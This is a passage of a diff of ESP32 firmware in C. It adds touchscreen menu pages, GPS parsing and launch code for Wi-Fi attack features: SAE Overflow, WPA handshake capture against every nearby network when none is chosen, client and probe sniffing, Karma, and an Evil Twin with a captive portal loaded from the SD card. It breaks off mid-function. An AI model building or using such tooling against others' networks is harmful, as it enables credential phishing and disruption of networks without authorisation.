+        lv_obj_set_style_border_width(back_btn, 2, 0);  // 2px border
+        lv_obj_t *back_lbl = lv_label_create(back_btn);
+        lv_label_set_text(back_lbl, "BACK");
+        lv_obj_set_style_text_color(back_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(back_lbl);
+        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
+        
+        // YES button (48% width to leave room for borders and padding)
+        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_set_style_border_color(yes_btn, lv_color_make(0, 255, 0), 0);  // Green border
+        lv_obj_set_style_border_width(yes_btn, 2, 0);  // 2px border
+        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
+        lv_label_set_text(yes_lbl, "YES");
+        lv_obj_set_style_text_color(yes_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(yes_lbl);
+        lv_obj_add_event_cb(yes_btn, sniffer_yes_btn_cb, LV_EVENT_CLICKED, NULL);
+        
+        return;
+    }
+
+    if (strcmp(attack_name, "SAE Overflow") == 0) {
+        // Show warning page - use base to avoid default center label
+        create_function_page_base("SAE Overflow");
+        
+        // Warning message in center
+        lv_obj_t *warning_label = lv_label_create(function_page);
+        lv_label_set_text(warning_label, "Warning: This will start\nSAE Overflow attack.\n\nSelect ONE network first.\n\nAre you sure?");
+        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
+        lv_obj_set_style_text_color(warning_label, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_16, 0);
+        lv_obj_center(warning_label);
+        
+        // Button container at bottom (15px higher)
+        lv_obj_t *btn_bar = lv_obj_create(function_page);
+        lv_obj_set_size(btn_bar, lv_pct(100), 50);
+        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
+        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
+        lv_obj_set_style_border_width(btn_bar, 0, 0);
+        lv_obj_set_style_radius(btn_bar, 0, 0);
+        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
+        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
+        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
+        
+        // BACK button (48% width to leave room for borders and padding)
+        lv_obj_t *back_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_set_style_border_color(back_btn, lv_color_make(0, 255, 0), 0);  // Green border
+        lv_obj_set_style_border_width(back_btn, 2, 0);  // 2px border
+        lv_obj_t *back_lbl = lv_label_create(back_btn);
+        lv_label_set_text(back_lbl, "BACK");
+        lv_obj_set_style_text_color(back_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(back_lbl);
+        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
+        
+        // YES button (48% width to leave room for borders and padding)
+        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_set_style_border_color(yes_btn, lv_color_make(0, 255, 0), 0);  // Green border
+        lv_obj_set_style_border_width(yes_btn, 2, 0);  // 2px border
+        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
+        lv_label_set_text(yes_lbl, "YES");
+        lv_obj_set_style_text_color(yes_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(yes_lbl);
+        lv_obj_add_event_cb(yes_btn, sae_overflow_yes_btn_cb, LV_EVENT_CLICKED, NULL);
+        
+        return;
+    }
+
+    if (strcmp(attack_name, "Handshakes") == 0) {
+        // Show warning page - use base to avoid default center label
+        create_function_page_base("Handshakes");
+        
+        // Warning message in center
+        lv_obj_t *warning_label = lv_label_create(function_page);
+        lv_label_set_text(warning_label, "WPA Handshake Capture\n\nSelected networks: Attack those\nNo selection: Scan & attack all\n\nAre you sure?");
+        lv_obj_set_style_text_align(warning_label, LV_TEXT_ALIGN_CENTER, 0);
+        lv_obj_set_style_text_color(warning_label, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_set_style_text_font(warning_label, &lv_font_montserrat_14, 0);
+        lv_obj_center(warning_label);
+        
+        // Button container at bottom (15px higher)
+        lv_obj_t *btn_bar = lv_obj_create(function_page);
+        lv_obj_set_size(btn_bar, lv_pct(100), 50);
+        lv_obj_align(btn_bar, LV_ALIGN_BOTTOM_MID, 0, -15);  // 15px higher
+        lv_obj_set_style_bg_color(btn_bar, lv_color_make(0, 0, 0), 0);  // Black background
+        lv_obj_set_style_border_width(btn_bar, 0, 0);
+        lv_obj_set_style_radius(btn_bar, 0, 0);
+        lv_obj_clear_flag(btn_bar, LV_OBJ_FLAG_SCROLLABLE);
+        lv_obj_set_flex_flow(btn_bar, LV_FLEX_FLOW_ROW);
+        lv_obj_set_style_pad_all(btn_bar, 4, 0);  // 4px padding
+        lv_obj_set_style_pad_gap(btn_bar, 4, 0);  // 4px gap between buttons
+        
+        // BACK button (48% width to leave room for borders and padding)
+        lv_obj_t *back_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(back_btn, lv_pct(48), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_set_style_border_color(back_btn, lv_color_make(0, 255, 0), 0);  // Green border
+        lv_obj_set_style_border_width(back_btn, 2, 0);  // 2px border
+        lv_obj_t *back_lbl = lv_label_create(back_btn);
+        lv_label_set_text(back_lbl, "BACK");
+        lv_obj_set_style_text_color(back_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(back_lbl);
+        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
+        
+        // YES button (48% width to leave room for borders and padding)
+        lv_obj_t *yes_btn = lv_btn_create(btn_bar);
+        lv_obj_set_size(yes_btn, lv_pct(48), LV_SIZE_CONTENT);
+        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black button
+        lv_obj_set_style_bg_color(yes_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+        lv_obj_set_style_border_color(yes_btn, lv_color_make(0, 255, 0), 0);  // Green border
+        lv_obj_set_style_border_width(yes_btn, 2, 0);  // 2px border
+        lv_obj_t *yes_lbl = lv_label_create(yes_btn);
+        lv_label_set_text(yes_lbl, "YES");
+        lv_obj_set_style_text_color(yes_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+        lv_obj_center(yes_lbl);
+        lv_obj_add_event_cb(yes_btn, handshake_yes_btn_cb, LV_EVENT_CLICKED, NULL);
+        
+        return;
+    }
+
+    if (strcmp(attack_name, "Start Wardrive") == 0) {
+        // Directly start wardrive - no warning
+        create_function_page_base("Wardrive");
+        wardrive_start_btn_cb(NULL);
+        return;
+    }
+
+    if (strcmp(attack_name, "Browse Networks") == 0) {
+        // Show last scan results with selection state
+        ui_locked = true;
+        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+        show_function_page("Browse Networks");
+        scan_list = lv_list_create(function_page);
+        lv_obj_set_size(scan_list, lv_pct(100), LCD_V_RES - 30);
+        lv_obj_align(scan_list, LV_ALIGN_BOTTOM_MID, 0, 0);
+        lv_obj_set_style_bg_color(scan_list, lv_color_make(0, 0, 0), 0);  // Black background
+        lv_obj_set_style_text_color(scan_list, lv_color_make(0, 255, 0), 0);  // Green text
+        // Remove white separator lines between items
+        lv_obj_set_style_border_width(scan_list, 0, LV_PART_ITEMS);
+        lv_obj_set_style_border_color(scan_list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
+
+        uint16_t count = wifi_scanner_get_count();
+        if (count == 0) {
+            lv_obj_t *msg_label = lv_label_create(scan_list);
+            lv_label_set_text(msg_label, "Scan networks first");
+            lv_obj_set_style_text_color(msg_label, lv_color_make(0, 255, 0), 0);  // Green text
+            lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
+            lv_obj_center(msg_label);
+            return;
+        }
+
+        // Fetch last results
+        wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * count);
+        if (!records) return;
+        int got = wifi_scanner_get_results(records, count);
+
+        // Build selected set
+        int sel_idx[MAX_SCAN_RESULTS];
+        int sel_cnt = wifi_scanner_get_selected(sel_idx, MAX_SCAN_RESULTS);
+        // Render rows
+        for (int i = 0; i < got; i++) {
+            lv_obj_t *row = lv_list_add_btn(scan_list, NULL, "");
+            lv_obj_set_width(row, lv_pct(100));
+            lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
+            lv_obj_set_style_pad_all(row, 8, 0);  // 1.2x bigger (was 6, now 8)
+            lv_obj_set_style_pad_gap(row, 10, 0);  // 1.2x bigger (was 8, now 10)
+            lv_obj_set_height(row, LV_SIZE_CONTENT);
+            lv_obj_set_style_bg_color(row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);  // Black background
+            lv_obj_set_style_bg_color(row, lv_color_make(0, 50, 0), LV_STATE_PRESSED);  // Dark green when pressed
+
+            lv_obj_t *cb = lv_checkbox_create(row);
+            lv_checkbox_set_text(cb, "");
+            lv_obj_add_event_cb(cb, scan_checkbox_event_cb, LV_EVENT_VALUE_CHANGED, (void *)(intptr_t)i);
+            // Green checkbox styling (retro terminal theme) - 1.2x bigger
+            lv_obj_set_style_bg_color(cb, lv_color_make(0, 0, 0), LV_PART_INDICATOR);  // Black background for checkbox
+            lv_obj_set_style_bg_color(cb, lv_color_make(0, 100, 0), LV_PART_INDICATOR | LV_STATE_CHECKED);  // Dark green when checked
+            lv_obj_set_style_border_color(cb, lv_color_make(0, 255, 0), LV_PART_INDICATOR);  // Green border
+            lv_obj_set_style_border_width(cb, 4, LV_PART_INDICATOR);  // 1.2x thicker border (was 3, now 4)
+            lv_obj_set_style_text_color(cb, lv_color_make(0, 255, 0), 0);  // Green text
+            lv_obj_set_style_pad_all(cb, 6, LV_PART_MAIN);  // Bigger checkbox padding
+            // Check if selected
+            bool is_selected = false;
+            for (int s = 0; s < sel_cnt; s++) { if (sel_idx[s] == i) { is_selected = true; break; } }
+            if (is_selected) lv_obj_add_state(cb, LV_STATE_CHECKED);
+
+            lv_obj_t *ssid_lbl = lv_label_create(row);
+            char name_buf[128];
+            const char *band = (records[i].primary <= 14) ? "2.4GHz" : "5GHz";
+            if (records[i].ssid[0] != 0) {
+                snprintf(name_buf, sizeof(name_buf), "%s (%s, %02X:%02X:%02X:%02X:%02X:%02X)", 
+                         (const char *)records[i].ssid, band,
+                         records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
+                         records[i].bssid[3], records[i].bssid[4], records[i].bssid[5]);
+            } else {
+                snprintf(name_buf, sizeof(name_buf), "%02X:%02X:%02X:%02X:%02X:%02X (%s)",
+                         records[i].bssid[0], records[i].bssid[1], records[i].bssid[2],
+                         records[i].bssid[3], records[i].bssid[4], records[i].bssid[5], band);
+            }
+            lv_label_set_text(ssid_lbl, name_buf);
+            lv_label_set_long_mode(ssid_lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
+            lv_obj_set_style_text_font(ssid_lbl, &lv_font_montserrat_14, 0);
+            lv_obj_set_style_text_color(ssid_lbl, lv_color_make(0, 255, 0), 0);  // Green text
+            lv_obj_align(ssid_lbl, LV_ALIGN_LEFT_MID, 0, 5);  // 5px down for better alignment
+            lv_obj_set_width(ssid_lbl, lv_pct(85));
+
+            if ((i & 3) == 3) {
+                vTaskDelay(pdMS_TO_TICKS(1));
+            }
+        }
+        lv_mem_free(records);
+        ui_locked = false;
+        return;
+    }
+
+    if (strcmp(attack_name, "Karma") == 0) {
+        show_karma_page();
+        return;
+    }
+
+    if (strcmp(attack_name, "Portal") == 0) {
+        show_portal_page();
+        return;
+    }
+
+    if (strcmp(attack_name, "Browse Clients") == 0) {
+        // Show sniffer AP list with clients (indented)
+        ui_locked = true;
+        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+        show_function_page("Browse Clients");
+        
+        lv_obj_t *list = lv_list_create(function_page);
+        lv_obj_set_size(list, lv_pct(100), LCD_V_RES - 30 - 50);
+        lv_obj_align(list, LV_ALIGN_TOP_MID, 0, 30);
+        lv_obj_set_style_bg_color(list, lv_color_make(0, 0, 0), 0);
+        lv_obj_set_style_text_color(list, lv_color_make(0, 255, 0), 0);
+        lv_obj_set_style_border_width(list, 0, LV_PART_ITEMS);
+        lv_obj_set_style_border_color(list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
+        
+        int ap_count = 0;
+        const sniffer_ap_t *aps = wifi_sniffer_get_aps(&ap_count);
+        
+        if (ap_count == 0 || aps == NULL) {
+            lv_obj_t *msg_label = lv_label_create(list);
+            lv_label_set_text(msg_label, "No APs sniffed yet.\nRun Sniffer first.");
+            lv_obj_set_style_text_color(msg_label, lv_color_make(0, 255, 0), 0);
+            lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
+        } else {
+            int displayed_aps = 0;
+            for (int i = 0; i < ap_count; i++) {
+                const sniffer_ap_t *ap = &aps[i];
+                
+                // Skip APs with no clients
+                if (ap->client_count == 0) {
+                    continue;
+                }
+                
+                displayed_aps++;
+                
+                // AP row (bold/larger)
+                lv_obj_t *ap_row = lv_list_add_btn(list, LV_SYMBOL_WIFI, "");
+                lv_obj_set_width(ap_row, lv_pct(100));
+                lv_obj_set_style_bg_color(ap_row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+                lv_obj_set_style_pad_all(ap_row, 6, 0);
+                
+                lv_obj_t *ap_label = lv_label_create(ap_row);
+                char ap_text[128];
+                if (ap->ssid[0] != '\0') {
+                    snprintf(ap_text, sizeof(ap_text), "%s (%02X:%02X:%02X:%02X:%02X:%02X) [%d clients]",
+                             ap->ssid, ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                             ap->bssid[3], ap->bssid[4], ap->bssid[5], ap->client_count);
+                } else {
+                    snprintf(ap_text, sizeof(ap_text), "<hidden> (%02X:%02X:%02X:%02X:%02X:%02X) [%d clients]",
+                             ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                             ap->bssid[3], ap->bssid[4], ap->bssid[5], ap->client_count);
+                }
+                lv_label_set_text(ap_label, ap_text);
+                lv_obj_set_style_text_color(ap_label, lv_color_make(0, 255, 0), 0);
+                lv_obj_set_style_text_font(ap_label, &lv_font_montserrat_14, 0);
+                lv_label_set_long_mode(ap_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
+                lv_obj_set_width(ap_label, lv_pct(85));
+                
+                // Client rows (indented)
+                for (int j = 0; j < ap->client_count && j < MAX_CLIENTS_PER_AP; j++) {
+                    const sniffer_client_t *client = &ap->clients[j];
+                    
+                    lv_obj_t *client_row = lv_list_add_btn(list, NULL, "");
+                    lv_obj_set_width(client_row, lv_pct(100));
+                    lv_obj_set_style_bg_color(client_row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+                    lv_obj_set_style_pad_left(client_row, 30, 0);  // Indent
+                    lv_obj_set_style_pad_all(client_row, 4, 0);
+                    
+                    lv_obj_t *client_label = lv_label_create(client_row);
+                    char client_text[96];
+                    snprintf(client_text, sizeof(client_text), "%02X:%02X:%02X:%02X:%02X:%02X (RSSI: %d)",
+                             client->mac[0], client->mac[1], client->mac[2],
+                             client->mac[3], client->mac[4], client->mac[5], client->rssi);
+                    lv_label_set_text(client_label, client_text);
+                    lv_obj_set_style_text_color(client_label, lv_color_make(0, 200, 0), 0);  // Slightly dimmer green
+                    lv_obj_set_style_text_font(client_label, &lv_font_montserrat_12, 0);  // Smaller font
+                    lv_label_set_long_mode(client_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
+                    lv_obj_set_width(client_label, lv_pct(80));
+                }
+                
+                // Throttle UI updates every 4 APs
+                if ((displayed_aps & 3) == 3) {
+                    vTaskDelay(pdMS_TO_TICKS(1));
+                }
+            }
+            
+            // If no APs with clients found, show message
+            if (displayed_aps == 0) {
+                lv_obj_t *msg_label = lv_label_create(list);
+                lv_label_set_text(msg_label, "No clients detected yet.\nAPs found but no clients.");
+                lv_obj_set_style_text_color(msg_label, lv_color_make(0, 255, 0), 0);
+                lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
+            }
+        }
+        
+        // Back button
+        lv_obj_t *back_btn = lv_btn_create(function_page);
+        lv_obj_set_size(back_btn, lv_pct(100), 45);
+        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);
+        lv_obj_set_style_border_color(back_btn, lv_color_make(0, 255, 0), 0);
+        lv_obj_set_style_border_width(back_btn, 3, 0);
+        lv_obj_t *back_lbl = lv_label_create(back_btn);
+        lv_label_set_text(back_lbl, "Back");
+        lv_obj_set_style_text_color(back_lbl, lv_color_make(0, 255, 0), 0);
+        lv_obj_center(back_lbl);
+        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
+        
+        ui_locked = false;
+        return;
+    }
+
+    if (strcmp(attack_name, "Show Probes") == 0) {
+        // Show probe requests list
+        ui_locked = true;
+        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+        show_function_page("Show Probes");
+        
+        lv_obj_t *list = lv_list_create(function_page);
+        lv_obj_set_size(list, lv_pct(100), LCD_V_RES - 30 - 50);
+        lv_obj_align(list, LV_ALIGN_TOP_MID, 0, 30);
+        lv_obj_set_style_bg_color(list, lv_color_make(0, 0, 0), 0);
+        lv_obj_set_style_text_color(list, lv_color_make(0, 255, 0), 0);
+        lv_obj_set_style_border_width(list, 0, LV_PART_ITEMS);
+        lv_obj_set_style_border_color(list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
+        
+        int probe_count = 0;
+        const probe_request_t *probes = wifi_sniffer_get_probes(&probe_count);
+        
+        if (probe_count == 0 || probes == NULL) {
+            lv_obj_t *msg_label = lv_label_create(list);
+            lv_label_set_text(msg_label, "No probes sniffed yet.\nRun Sniffer first.");
+            lv_obj_set_style_text_color(msg_label, lv_color_make(0, 255, 0), 0);
+            lv_obj_set_style_text_font(msg_label, &lv_font_montserrat_14, 0);
+        } else {
+            for (int i = 0; i < probe_count; i++) {
+                const probe_request_t *probe = &probes[i];
+                
+                lv_obj_t *probe_row = lv_list_add_btn(list, LV_SYMBOL_CALL, "");
+                lv_obj_set_width(probe_row, lv_pct(100));
+                lv_obj_set_style_bg_color(probe_row, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+                lv_obj_set_style_pad_all(probe_row, 6, 0);
+                
+                lv_obj_t *probe_label = lv_label_create(probe_row);
+                char probe_text[160];
+                if (probe->ssid[0] != '\0') {
+                    snprintf(probe_text, sizeof(probe_text), "%02X:%02X:%02X:%02X:%02X:%02X \"%s\" (RSSI: %d)",
+                             probe->mac[0], probe->mac[1], probe->mac[2],
+                             probe->mac[3], probe->mac[4], probe->mac[5],
+                             probe->ssid, probe->rssi);
+                } else {
+                    snprintf(probe_text, sizeof(probe_text), "%02X:%02X:%02X:%02X:%02X:%02X <broadcast> (RSSI: %d)",
+                             probe->mac[0], probe->mac[1], probe->mac[2],
+                             probe->mac[3], probe->mac[4], probe->mac[5], probe->rssi);
+                }
+                lv_label_set_text(probe_label, probe_text);
+                lv_obj_set_style_text_color(probe_label, lv_color_make(0, 255, 0), 0);
+                lv_obj_set_style_text_font(probe_label, &lv_font_montserrat_12, 0);
+                lv_label_set_long_mode(probe_label, LV_LABEL_LONG_SCROLL_CIRCULAR);
+                lv_obj_set_width(probe_label, lv_pct(85));
+                
+                // Throttle UI updates every 8 probes
+                if ((i & 7) == 7) {
+                    vTaskDelay(pdMS_TO_TICKS(1));
+                }
+            }
+        }
+        
+        // Back button
+        lv_obj_t *back_btn = lv_btn_create(function_page);
+        lv_obj_set_size(back_btn, lv_pct(100), 45);
+        lv_obj_align(back_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+        lv_obj_set_style_bg_color(back_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);
+        lv_obj_set_style_border_color(back_btn, lv_color_make(0, 255, 0), 0);
+        lv_obj_set_style_border_width(back_btn, 3, 0);
+        lv_obj_t *back_lbl = lv_label_create(back_btn);
+        lv_label_set_text(back_lbl, "Back");
+        lv_obj_set_style_text_color(back_lbl, lv_color_make(0, 255, 0), 0);
+        lv_obj_center(back_lbl);
+        lv_obj_add_event_cb(back_btn, back_to_menu_cb, LV_EVENT_CLICKED, NULL);
+        
+        ui_locked = false;
+        return;
+    }
+
+    // Default: open function page
+    show_function_page(attack_name);
+}
+
+// Standard stdio behavior restored; no write overrides
+
+// === GPS IMPLEMENTATION ===
+static esp_err_t init_gps_uart(void)
+{
+	uart_config_t uart_config = {
+		.baud_rate = 9600,
+		.data_bits = UART_DATA_8_BITS,
+		.parity = UART_PARITY_DISABLE,
+		.stop_bits = UART_STOP_BITS_1,
+		.flow_ctrl = UART_HW_FLOWCTRL_DISABLE,
+		.source_clk = UART_SCLK_DEFAULT,
+	};
+
+	esp_err_t err;
+	if ((err = uart_driver_install(GPS_UART_NUM, GPS_BUF_SIZE * 2, 0, 0, NULL, 0)) != ESP_OK) return err;
+	if ((err = uart_param_config(GPS_UART_NUM, &uart_config)) != ESP_OK) return err;
+	if ((err = uart_set_pin(GPS_UART_NUM, GPS_TX_PIN, GPS_RX_PIN, UART_PIN_NO_CHANGE, UART_PIN_NO_CHANGE)) != ESP_OK) return err;
+	return ESP_OK;
+}
+
+static bool parse_gps_nmea(const char *nmea_sentence)
+{
+	if (!nmea_sentence || strlen(nmea_sentence) < 10) return false;
+	// Parse GPGGA or GNGGA for fix
+	if (strncmp(nmea_sentence, "$GPGGA", 6) == 0 || strncmp(nmea_sentence, "$GNGGA", 6) == 0) {
+		char sentence[256];
+		strncpy(sentence, nmea_sentence, sizeof(sentence) - 1);
+		sentence[sizeof(sentence) - 1] = '\0';
+
+		char *token = strtok(sentence, ",");
+		int field = 0;
+		float lat_deg = 0, lat_min = 0;
+		float lon_deg = 0, lon_min = 0;
+		char lat_dir = 'N', lon_dir = 'E';
+		int quality = 0;
+		float altitude = 0;
+		float hdop = 1.0f;
+
+		while (token != NULL) {
+			switch (field) {
+				case 2: // Latitude DDMM.MMMM
+					if (strlen(token) > 4) { lat_deg = (token[0]-'0')*10 + (token[1]-'0'); lat_min = atof(token+2); }
+					break;
+				case 3: lat_dir = token[0]; break;
+				case 4: // Longitude DDDMM.MMMM
+					if (strlen(token) > 5) { lon_deg = (token[0]-'0')*100 + (token[1]-'0')*10 + (token[2]-'0'); lon_min = atof(token+3); }
+					break;
+				case 5: lon_dir = token[0]; break;
+				case 6: quality = atoi(token); break;
+				case 8: hdop = atof(token); break;
+				case 9: altitude = atof(token); break;
+			}
+			token = strtok(NULL, ",");
+			field++;
+		}
+
+		if (quality > 0) {
+			current_gps.latitude = lat_deg + lat_min / 60.0f;
+			if (lat_dir == 'S') current_gps.latitude = -current_gps.latitude;
+			current_gps.longitude = lon_deg + lon_min / 60.0f;
+			if (lon_dir == 'W') current_gps.longitude = -current_gps.longitude;
+			current_gps.altitude = altitude;
+			current_gps.accuracy = hdop * 4.0f;
+			current_gps.valid = true;
+			return true;
+		}
+	}
+	return false;
+}
+
+static void gps_task(void *arg)
+{
+	(void)arg;
+	for (;;) {
+		int len = uart_read_bytes(GPS_UART_NUM, (uint8_t *)gps_rx_buffer, GPS_BUF_SIZE - 1, pdMS_TO_TICKS(200));
+		if (len > 0) {
+			gps_rx_buffer[len] = '\0';
+			char *line = strtok(gps_rx_buffer, "\r\n");
+			while (line != NULL) {
+				parse_gps_nmea(line);
+				line = strtok(NULL, "\r\n");
+			}
+		}
+		vTaskDelay(pdMS_TO_TICKS(100));
+	}
+}
+
+static void evil_twin_start_btn_cb(lv_event_t *e)
+{
+    (void)e;
+
+    if (!evil_twin_network_dd || !evil_twin_html_dd) {
+        return;
+    }
+
+    if (evil_twin_network_count == 0 || evil_twin_html_count == 0) {
+        if (evil_twin_status_label) {
+            lv_label_set_text(evil_twin_status_label, "Cannot start: missing selections");
+        }
+        return;
+    }
+
+    int net_sel = lv_dropdown_get_selected(evil_twin_network_dd);
+    int html_sel = lv_dropdown_get_selected(evil_twin_html_dd);
+
+    if (net_sel < 0 || net_sel >= evil_twin_network_count ||
+        html_sel < 0 || html_sel >= evil_twin_html_count) {
+        if (evil_twin_status_label) {
+            lv_label_set_text(evil_twin_status_label, "Invalid selection");
+        }
+        return;
+    }
+
+    const uint16_t *count_ptr = wifi_scanner_get_count_ptr();
+    uint16_t total_count = count_ptr ? *count_ptr : 0;
+    const wifi_ap_record_t *records = wifi_scanner_get_results_ptr();
+
+    int record_index = evil_twin_network_map[net_sel];
+    if (!records || record_index < 0 || record_index >= total_count) {
+        if (evil_twin_status_label) {
+            lv_label_set_text(evil_twin_status_label, "Selected network unavailable");
+        }
+        return;
+    }
+
+    char ssid[33];
+    if (records[record_index].ssid[0]) {
+        snprintf(ssid, sizeof(ssid), "%s", (const char *)records[record_index].ssid);
+    } else {
+        snprintf(ssid, sizeof(ssid), "%02X%02X%02X%02X%02X%02X",
+                 records[record_index].bssid[0], records[record_index].bssid[1], records[record_index].bssid[2],
+                 records[record_index].bssid[3], records[record_index].bssid[4], records[record_index].bssid[5]);
+    }
+
+    int html_index = evil_twin_html_map[html_sel];
+    const char *html_name = wifi_attacks_get_sd_html_name(html_index);
+
+    if (evil_twin_status_label) {
+        char info[128];
+        const char *html_display = html_name;
+        if (html_display) {
+            const char *slash = strrchr(html_display, '/');
+            if (slash) {
+                html_display = slash + 1;
+            }
+        }
+        snprintf(info, sizeof(info), "Starting Evil Twin on '%s' with portal '%s'",
+                 ssid,
+                 html_display ? html_display : "(none)");
+        lv_label_set_text(evil_twin_status_label, info);
+    }
+
+    create_function_page_base("Evil Twin Log");
+
+    evil_twin_log_ta = lv_textarea_create(function_page);
+    lv_obj_set_size(evil_twin_log_ta, lv_pct(100), LCD_V_RES - 30 - 45);  // Leave space for Exit button
+    lv_obj_align(evil_twin_log_ta, LV_ALIGN_TOP_MID, 0, 30);
+    lv_textarea_set_one_line(evil_twin_log_ta, false);
+    lv_textarea_set_cursor_click_pos(evil_twin_log_ta, false);
+    lv_textarea_set_password_mode(evil_twin_log_ta, false);
+    lv_textarea_set_text(evil_twin_log_ta, "");
+    // Retro terminal styling
+    lv_obj_set_style_bg_color(evil_twin_log_ta, lv_color_make(0, 0, 0), 0);  // Black background
+    lv_obj_set_style_text_color(evil_twin_log_ta, lv_color_make(0, 255, 0), 0);  // Green text
+
+    // Exit button at the bottom
+    lv_obj_t *exit_btn = lv_btn_create(function_page);
+    lv_obj_set_size(exit_btn, lv_pct(100), 40);
+    lv_obj_align(exit_btn, LV_ALIGN_BOTTOM_MID, 0, 0);
+    lv_obj_set_style_bg_color(exit_btn, lv_color_make(0, 0, 0), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(exit_btn, lv_color_make(0, 50, 0), LV_STATE_PRESSED);
+    lv_obj_set_style_border_color(exit_btn, lv_color_make(0, 255, 0), 0);
+    lv_obj_set_style_border_width(exit_btn, 3, 0);
+    lv_obj_add_event_cb(exit_btn, deauth_quit_event_cb, LV_EVENT_CLICKED, NULL);  // Reuse quit callback
+    
+    lv_obj_t *exit_label = lv_label_create(exit_btn);
+    lv_label_set_text(exit_label, "Exit");
+    lv_obj_set_style_text_color(exit_label, lv_color_make(0, 255, 0), 0);
+    lv_obj_center(exit_label);
+
+    if (evil_twin_enable_log_capture() != ESP_OK) {
+        lv_textarea_add_text(evil_twin_log_ta, "Failed to initialize log capture\n");
+        return;
+    }
+
+    char header[160];
+    snprintf(header, sizeof(header), "Launching Evil Twin for %s\n", ssid);
+    lv_textarea_add_text(evil_twin_log_ta, header);
+    lv_textarea_set_cursor_pos(evil_twin_log_ta, LV_TEXTAREA_CURSOR_LAST);
+
+    if (html_name) {
+        const char *html_display = strrchr(html_name, '/');
+        if (html_display) {
+            html_display++;
+        } else {
+            html_display = html_name;
+        }
+
+        esp_err_t html_res = wifi_attacks_select_sd_html(html_index);
+        if (html_res != ESP_OK) {
+            char warn[120];
+            snprintf(warn, sizeof(warn), "Failed to set portal template: %s\n", esp_err_to_name(html_res));
